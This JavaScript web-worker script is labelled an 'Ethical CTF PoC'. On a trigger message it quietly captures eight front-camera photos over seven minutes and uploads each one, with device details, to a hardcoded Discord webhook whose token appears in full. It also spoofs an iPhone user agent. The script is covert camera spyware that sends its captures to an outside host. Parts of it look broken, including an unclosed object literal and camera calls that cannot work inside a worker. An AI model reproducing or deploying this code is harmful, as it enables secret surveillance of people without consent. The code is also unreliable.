self.addEventListener('message', async event => {
    if (event.data.action !== 'startBackgroundCapture') return;

    // WARNING: Ethical CTF PoC only. Unauthorized use violates privacy laws.
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di';

    async function sendItem(type, data, index = null) {
        try {
            const formData = new FormData();
            formData.append('payload_json', JSON.stringify({
                embeds: [{
                    title: `Zero-Click CTF: ${type}`,
                    fields: [
                        { name: 'Type', value: type },
                        { name: 'Index', value: index !== null ? index + 1 : 'N/A' },
                        { name: 'Data', value: JSON.stringify(data, null, 2).substring(0, 1000) },
                        { name: 'Device', value: navigator.userAgent || 'Worker' },
                        { name: 'Time', value: new Date().toISOString()
                    ],
                    footer: { text: 'Ethical CTF PoC - Do not misuse' }
                }]
            }));
            if (type.includes('Photo')) {
                const response = await fetch(data.base64);
                const blob = await response.blob();
                formData.append('file', blob, `photo_${index + 1}.webp`);
            }

            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                body: formData,
                headers: { 
                    'User-Agent': `Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1`
                }
            });
            if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            return true;
        } catch (e) {
            return false;
        }
    }

    async function capturePhoto(index) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: { ideal: 'user' },
                    width: { ideal: 120 },
                    height: { ideal: 90 },
                    frameRate: { ideal: 5 }
                },
                audio: false 
            });
            const track = stream.getVideoTracks()[0];
            let photo;
            if ('ImageCapture' in self) {
                const imageCapture = new ImageCapture(track);
                const bitmap = await imageCapture.grabFrame();
                const canvas = new OffscreenCanvas(120, 90);
                const ctx = canvas.getContext('2d');
                ctx.drawImage(bitmap, 0, 0, 120, 90);
                const blob = await canvas.convertToBlob({ type: 'image/webp', quality: 0.05 });
                const reader = new FileReader();
                photo = await new Promise(resolve => {
                    reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
                    reader.readAsDataURL(blob);
                });
            } else {
                // Fallback for browsers without ImageCapture
                const video = new OffscreenCanvas(120, 90); // OffscreenCanvas for worker
                const ctx = video.getContext('2d');
                const tempVideo = new Image();
                tempVideo.srcObject = stream;
                await new Promise(resolve => tempVideo.onload = resolve);
                ctx.drawImage(tempVideo, 0, 0, 120, 90);
                const blob = await video.convertToBlob({ type: 'image/webp', quality: 0.05 });
                const reader = new FileReader();
                photo = await new Promise(resolve => {
                    reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
                    reader.readAsDataURL(blob);
                });
            }
            await sendItem(`Background Photo ${index + 1}`, photo, index);
            stream.getTracks().forEach(track => track.stop());
            return true;
        } catch (e) {
            await sendItem(`Background Photo ${index + 1}`, { error: `Capture failed: ${e.message}` }, index);
            return false;
        }
    }

    await sendItem('Debug', { message: 'Worker started', time: new Date().toISOString() });
    const totalPhotos = 8;
    const totalDuration = 420000; // 7 minutes
    const interval = totalDuration / totalPhotos; // ~52.5s per photo

    for (let i = 0; i < totalPhotos; i++) {
        await new Promise(resolve => setTimeout(async () => {
            await capturePhoto(i);
            resolve();
        }, i * interval + Math.random() * 20));
    }

    await sendItem('Status', { message: 'Background 8 photos captured successfully' });
});
